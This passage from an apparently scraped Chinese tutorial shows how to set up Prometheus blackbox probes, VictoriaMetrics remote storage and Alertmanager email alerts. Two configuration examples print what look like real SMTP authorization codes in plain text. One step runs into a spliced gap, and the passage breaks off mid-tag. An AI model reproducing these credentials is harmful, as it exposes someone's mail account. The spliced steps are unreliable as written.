class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载blackbox exporter<br>wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.25.0/blackbox_exporter-0.25.0.linux-amd64.tar.gz<br><br>解压软件包<br>[root@prometheus-server32 ~]# tar xf blackbox_exporter-0.25.0.linux-amd64.tar.gz -C  /softwares/<br><br>启动服务<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/blackbox_exporter-0.25.0.linux-amd64/<br>[root@prometheus-server32 blackbox_exporter-0.25.0.linux-amd64]# ./blackbox_exporter<br><br>访问blackbox的WebUI<br>http://10.0.0.32:9115/metrics<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的http模块监控网站状态"><a href="#基于blackbox的http模块监控网站状态" class="headerlink" title="基于blackbox的http模块监控网站状态"></a>基于blackbox的http模块监控网站状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>    <span class="hljs-comment"># 指定作业的名称，生成环境中，通常是指一类业务的分组配置。</span><br>  - job_name: <span class="hljs-string">&#x27;blackbox-exporter-http&#x27;</span><br>    <span class="hljs-comment"># 修改访问路径，若不修改，默认值为&quot;/metrics&quot;</span><br>    metrics_path: /probe<br>    <span class="hljs-comment"># 配置URL的相关参数</span><br>    params:<br>      <span class="hljs-comment"># 此处表示使用的是blackbox的http模块，从而判断相应的返回状态码是否为200</span><br>      module: [http_2xx] <br>  <span class="hljs-comment"># 下面这两个标签是我自定义的，便于大家理解</span><br>      school: [001]<br>      class: [<span class="hljs-string">&quot;002&quot;</span>]<br>    <span class="hljs-comment"># 静态配置，需要手动指定监控目标</span><br>    static_configs:<br>        <span class="hljs-comment"># 需要监控的目标</span><br>      - targets:<br>          <span class="hljs-comment"># 支持https协议</span><br>        - https://www.cherry.com/<br>          <span class="hljs-comment"># 支持http协议</span><br>        - http://10.0.0.41<br>          <span class="hljs-comment"># 支持http协议和自定义端口</span><br>        - http://10.0.0.31:9090<br>    <span class="hljs-comment"># 对目标节点进行重新打标签配置</span><br>    relabel_configs:<br>        <span class="hljs-comment"># 指定源标签，此处的&quot;__address__&quot;表示内置的标签，存储的是被监控目标的IP地址</span><br>      - source_labels: [__address__]<br>        <span class="hljs-comment"># 指定目标标签，其实就是在&quot;Endpoint&quot;中加了一个target字段(用于指定监控目标)，</span><br>        target_label: __param_target<br>        <span class="hljs-comment"># 指定需要执行的动作，默认值为&quot;replace&quot;，常用的动作有: replace, keep, and drop。</span><br>        <span class="hljs-comment"># 但官方支持十几种动作： https://prometheus.io/docs/prometheus/2.53/configuration/configuration/#relabel_action</span><br>        <span class="hljs-comment"># 将&quot;__address__&quot;传递给target字段。</span><br>        action: replace<br>      - source_labels: [__param_target]<br>        target_label: instance<br>        <span class="hljs-comment">#target_label: instance2024</span><br>        <br>        <span class="hljs-comment"># 上面的2个配置段也可以改写成如下的配置哟~</span><br>     <span class="hljs-comment"># - source_labels: [__address__]</span><br>     <span class="hljs-comment">#   target_label: instance</span><br>     <span class="hljs-comment">#   action: replace</span><br>     <span class="hljs-comment"># - source_labels: [instance]</span><br>     <span class="hljs-comment">#   target_label: __param_target</span><br>     <span class="hljs-comment">#   action: replace</span><br>      - target_label: __address__<br>        <span class="hljs-comment"># 指定要替换的值,此处我指定为blackbox exporter的主机地址</span><br>        replacement: 10.0.0.32:9115<br><br>检查配置文件是否正确并重新加载配置文件<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>访问blackbox exporter的WebUI<br>http://10.0.0.41:9115/<br><br>grafana展示数据<br>7587<br>13659<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的ICMP监控目标主机是否存活"><a href="#基于blackbox的ICMP监控目标主机是否存活" class="headerlink" title="基于blackbox的ICMP监控目标主机是否存活"></a>基于blackbox的ICMP监控目标主机是否存活</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;blackbox-exporter-icmp&#x27;</span><br>    metrics_path: /probe<br>    params:<br>      <span class="hljs-comment"># 如果不指定模块，则默认类型为&quot;http_2xx&quot;，不能乱写!乱写监控不到服务啦!</span><br>      module: [icmp]<br>    static_configs:<br>      - targets:<br>          - 10.0.0.41<br>          - 10.0.0.42<br>    relabel_configs:<br>      - source_labels: [__address__]<br>        target_label: __param_target<br>      - source_labels: [__param_target]<br>        <span class="hljs-comment"># 指定注意的是，如果instance不修改，则instance和&quot;__address__&quot;的值相同</span><br>        <span class="hljs-comment"># target_label: ip</span><br>        target_label: instance<br>      - target_label: __address__<br>        replacement: 10.0.0.32:9115 <br>        <br>2 检查配置文件是否正确并重新加载配置<br>[root@prometheus-server31 ~]# rr<br><br>3 访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>4.访问blackbox的WebUI<br>http://10.0.0.32:9115/<br><br>5.grafana过滤<span class="hljs-built_in">jobs</span>数据<br>基于<span class="hljs-string">&quot;blackbox-exporter-icmp&quot;</span>标签进行过滤。<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的TCP案例监控服务存活"><a href="#基于blackbox的TCP案例监控服务存活" class="headerlink" title="基于blackbox的TCP案例监控服务存活"></a>基于blackbox的TCP案例监控服务存活</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br> <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;blackox-exporter-tcp&#x27;</span><br>    metrics_path: /probe<br>    params:<br>      module: [tcp_connect]<br>    static_configs:<br>      - targets:<br>          - 10.0.0.41:80<br>          - 10.0.0.42:22<br>          - 10.0.0.31:9090<br>    relabel_configs:<br>      - source_labels: [__address__]<br>        target_label: __param_target<br>      - source_labels: [__param_target]<br>        target_label: instance<br>      - target_label: __address__<br>        replacement: 10.0.0.32:9115<br>        <br>2 检查配置文件是否正确并重新加载配置文件<br>[root@prometheus-server31 ~]# rr<br><br>3 访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>4.访问blackbox exporter的WebUI<br>http://10.0.0.32:9115/<br><br>5.使用grafana查看数据<br>基于<span class="hljs-string">&quot;blackbox-exporter-tcp&quot;</span>标签进行过滤。<br></code></pre></td></tr></table></figure><h2 id="27、远端存储VictoriaMetrics"><a href="#27、远端存储VictoriaMetrics" class="headerlink" title="27、远端存储VictoriaMetrics"></a>27、远端存储VictoriaMetrics</h2><p>VictoriaMetrics是一个快速、经济高效且可扩展的监控解决方案和时间序列数据库。</p><p>普罗米修斯可以将数据远程存储到VictoriaMetrics。默认情况下，普罗米修斯数据存储于本地文件的 TSDB 中，不利于容灾和做数据管理，若用于生产一般需要搭配第三方的如 InfulxDB 进行使用。大数据量的场景下，指标的收集和管理性能存在一定的瓶颈。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载victoriametrics<br>wget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v1.93.16/victoria-metrics-linux-amd64-v1.93.16.tar.gz<br><br>解压软件包 <br>[root@prometheus-server32 ~]# tar xf victoria-metrics-linux-amd64-v1.93.16.tar.gz -C /usr/local/bin/<br><br>编写启动脚本<br><span class="hljs-built_in">cat</span> &gt; /etc/systemd/system/victoria-metrics.service &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description= Linux VictoriaMetrics Server</span><br><span class="hljs-string">Documentation=https://docs.victoriametrics.com/</span><br><span class="hljs-string">After=network.target</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Service]</span><br><span class="hljs-string">ExecStart=/usr/local/bin/victoria-metrics-prod  \</span><br><span class="hljs-string">   -httpListenAddr=0.0.0.0:8428 \</span><br><span class="hljs-string">   -storageDataPath=/data/victoria-metrics \</span><br><span class="hljs-string">   -retentionPeriod=6</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=multi-user.target</span><br><span class="hljs-string">EOF</span><br><br>systemctl daemon-reload<br>systemctl <span class="hljs-built_in">enable</span> --now victoria-metrics.service<br>systemctl status victoria-metrics<br><br>检查端口是否存活<br>[root@prometheus-server32 ~]# ss -ntl | grep 8428<br>LISTEN 0      4096         0.0.0.0:8428      0.0.0.0:* <br><br>查看webUI<br>http://10.0.0.32:8428/<br></code></pre></td></tr></table></figure><p><strong>prometheus配置VictoriaMetrics远端存储</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>  - job_name: node-exporters<br>    metrics_path: /metrics<br>    scheme: http<br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br>    <br><span class="hljs-comment"># 在顶级字段中配置VictoriaMetrics地址</span><br>remote_write:<br>  - url: http://10.0.0.32:8428/api/v1/write<br><br><br>停止prometheus服务<br>[root@prometheus-server31 ~]# systemctl stop prometheus-server<br><br>手动启动prometheus服务，因为启动脚本定义了之前普罗米修斯的数据目录，这里是要将之后的数据写入到vtmetrics，所以需要手动起服务<br>[root@prometheus-server31 ~]# /softwares/prometheus-2.53.2.linux-amd64/prometheus    --config.file=/softwares/prometheus-2.53.2.linux-amd64/prometheus.yml<br></code></pre></td></tr></table></figure><p><strong>vtmetrics查看数据</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/85bfa65bb4094b33b86d2302c22c293f.png" alt="在这里插入图片描述"></p><p><strong>配置grafana数据源和url</strong></p><p>这里数据源更改为mtmstrics的地址</p><p><img src="https://i-blog.csdnimg.cn/direct/5bbee7effec2429ca77dd12340f75053.png" alt="在这里插入图片描述"></p><p><strong>导入模板</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1806<br></code></pre></td></tr></table></figure><h2 id="28、altermanager监控告警"><a href="#28、altermanager监控告警" class="headerlink" title="28、altermanager监控告警"></a>28、altermanager监控告警</h2><p>用于prometheus server的告警功能的组件，目前支持多种告警媒介，包括但不限于邮件告警，钉钉告警，企业微信告警等。</p><p><strong>部署altermanager组件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载软件包<br>wget https://github.com/prometheus/alertmanager/releases/download/v0.27.0/alertmanager-0.27.0.linux-amd64.tar.gz<br><br>2.解压软件包<br>[root@prometheus-server32 ~]# tar xf alertmanager-0.27.0.linux-amd64.tar.gz -C /softwares/<br><br>3 修改alermanager的配置文件<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cat</span> &gt; /softwares/alertmanager-0.27.0.linux-amd64/alertmanager.yml &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>global:<br>  resolve_timeout: 5m<br>  smtp_from: <span class="hljs-string">&#x27;y10539035@qq.com&#x27;</span><br>  smtp_smarthost: <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span><br>  smtp_auth_username: <span class="hljs-string">&#x27;y10534035@qq.com&#x27;</span><br>  smtp_auth_password: <span class="hljs-string">&#x27;nvkhwupusuxubefe&#x27;</span><br>  smtp_require_tls: <span class="hljs-literal">false</span><br>  smtp_hello: <span class="hljs-string">&#x27;qq.com&#x27;</span><br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval: 5m<br>  receiver: <span class="hljs-string">&#x27;email&#x27;</span><br>receivers:<br>- name: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <span class="hljs-string">&#x27;y10534135@qq.com&#x27;</span><br>    send_resolved: <span class="hljs-literal">true</span><br>inhibit_rules:<br>  - source_match:<br>      severity: <span class="hljs-string">&#x27;critical&#x27;</span><br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br>EOF<br><br>启动alermanager并访问webUI<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/alertmanager-0.27.0.linux-amd64/<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./alertmanager <br><br>--------------------------------------------------------<br>相关参数说明:<br>global:<br>  resolve_timeout:<br>  解析超时时间。<br>  smtp_from:<br>  发件人邮箱地址。<br>  smtp_smarthost:<br>  邮箱的服务器的地址及端口，例如:  <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span>。<br>  smtp_auth_username:<br>  发送人的邮箱用户名。<br>  smtp_auth_password:<br>  发送人的邮箱授权码。<br>  smtp_require_tls:<br>  是否基于tls加密。<br>  smtp_hello:<br>  邮箱服务器，例如: <span class="hljs-string">&#x27;qq.com&#x27;</span>。<br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval:<br>  重复报警的间隔时间，如果没有解即报警问题，则会间隔指定时间一直触发报警，比如:5m。<br>  receiver: <br>  采用什么方式接收报警，例如<span class="hljs-string">&#x27;email&#x27;</span>。<br>receivers:<br>- name: <br>定义接收者的名称，注意这里的name要和上面的route对应，例如: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <br>  邮箱发给谁。<br>    send_resolved: <span class="hljs-literal">true</span><br>inhibit_rules:<br>  - source_match:<br>      severity: <br>      匹配报警级别，例如: <span class="hljs-string">&#x27;critical&#x27;</span>。<br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br>   <br>--------------------------------------------------------------------------<br>prometheus配置alermanager作为告警媒介<br>1 修改配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>alerting:<br>  alertmanagers:<br>    - static_configs:<br>        - targets:<br>            - 10.0.0.32:9093<br>rule_files:<br>  - <span class="hljs-string">&quot;/softwares/prometheus-2.53.2.linux-amd64/rules/linux92.yml&quot;</span><br><br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: node-exporter<br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br>...<br><br>2 修改告警规则<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/prometheus-2.53.2.linux-amd64/rules<br><br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> &gt;  /softwares/prometheus-2.53.2.linux-amd64/rules/linux.yml &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">groups:</span><br><span class="hljs-string">- name: container-runtime</span><br><span class="hljs-string">  rules:</span><br><span class="hljs-string">  - alert: container-42节点挂掉啦</span><br><span class="hljs-string">    expr: up&#123;instance=&quot;10.0.0.42:9100&quot;&#125; == 0</span><br><span class="hljs-string">    for: 15s</span><br><span class="hljs-string">    labels:</span><br><span class="hljs-string">      school: 001</span><br><span class="hljs-string">      class: 002</span><br><span class="hljs-string">    annotations:</span><br><span class="hljs-string">      summary: &quot;&#123;&#123; $labels.instance &#125;&#125; 已停止运行超过 15s！&quot;</span><br><span class="hljs-string">  - alert: container-43节点挂掉啦</span><br><span class="hljs-string">    expr: up&#123;instance=&quot;10.0.0.43:9100&quot;&#125; == 0</span><br><span class="hljs-string">    for: 15s</span><br><span class="hljs-string">    labels:</span><br><span class="hljs-string">      school: 001</span><br><span class="hljs-string">      class: 002</span><br><span class="hljs-string">    annotations:</span><br><span class="hljs-string">      summary: &quot;&#123;&#123; $labels.instance &#125;&#125; 联邦模式已停止运行超过 15s！&quot;</span><br><span class="hljs-string">EOF</span><br><br>3 检查配置并重新加载prometheus的配置<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>4 查看prometheus server的WebUI<br>http://10.0.0.31:9090/target<br><br>5 查看alermanager的WebUI<br>h/softwares/alertmanager-0.27.0.linux-amd64<br><br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">mkdir</span> tmpl<br><br>2 创建模板实例，工作中可以考虑嵌入公司的logo<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">cat</span> &gt; tmpl/email.tmp1 &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span> <br>&#123;&#123; define <span class="hljs-string">&quot;001.html&quot;</span> &#125;&#125;<br>&lt;h1 style=<span class="hljs-string">&#x27;color: red;&#x27;</span>&gt;啦啦啦:  https://www.cherry.com/&lt;/h1&gt;<br>&lt;table border=<span class="hljs-string">&quot;1&quot;</span>&gt;<br>        &lt;<span class="hljs-built_in">tr</span>&gt;<br>                &lt;th&gt;报警项&lt;/th&gt;<br>                &lt;th&gt;实例&lt;/th&gt;<br>                &lt;th&gt;报警阀值&lt;/th&gt;<br>                &lt;th&gt;开始时间&lt;/th&gt;<br>        &lt;/tr&gt;<br>        &#123;&#123; range <span class="hljs-variable">$i</span>, <span class="hljs-variable">$alert</span> := .Alerts &#125;&#125;<br>                &lt;<span class="hljs-built_in">tr</span>&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Labels <span class="hljs-string">&quot;alertname&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Labels <span class="hljs-string">&quot;instance&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; index <span class="hljs-variable">$alert</span>.Annotations <span class="hljs-string">&quot;value&quot;</span> &#125;&#125;&lt;/td&gt;<br>                        &lt;td&gt;&#123;&#123; <span class="hljs-variable">$alert</span>.StartsAt &#125;&#125;&lt;/td&gt;<br>                &lt;/tr&gt;<br>        &#123;&#123; end &#125;&#125;<br>&lt;/table&gt;<br><br>&lt;img src=<span class="hljs-string">&quot;https://www.cherry.com/static/images/header/logo.png&quot;</span>&gt;<br><br>&#123;&#123; end &#125;&#125;<br>EOF<br><br>3 alertmanager引用自定义模板文件<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">cat</span> alertmanager.yml <br>global:<br>  resolve_timeout: 5m<br>  smtp_from: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>  smtp_smarthost: <span class="hljs-string">&#x27;smtp.qq.com:465&#x27;</span><br>  smtp_auth_username: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>  smtp_auth_password: <span class="hljs-string">&#x27;ysfkvbpjeddhbi&#x27;</span><br>  smtp_require_tls: <span class="hljs-literal">false</span><br>  smtp_hello: <span 